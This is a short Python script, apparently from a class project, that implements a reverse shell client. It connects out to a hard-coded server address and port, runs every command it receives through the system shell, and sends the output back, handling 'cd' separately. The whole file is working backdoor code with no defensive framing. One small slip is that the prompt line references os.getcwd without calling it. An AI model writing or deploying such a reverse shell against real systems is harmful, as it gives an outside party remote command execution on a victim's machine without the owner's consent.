import socket 
import os
import subprocess


host = '10.1.162.188' # change that to the IP address of the server
port = 9999 # change that to the port of the server
s = socket.socket()

s.connect((host, port))


while True:
    data = s.recv(1024) #1024 is the buffer size

    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
            
    if len(data) > 0: 
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # get trough the standard input, output and error
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd) + '> '))
        
        # TO DELETE BEFORE DEADLINE
        print (output_str) # print the output of the command on the client machine


# if we get out of the loop, we close the connection
s.close()
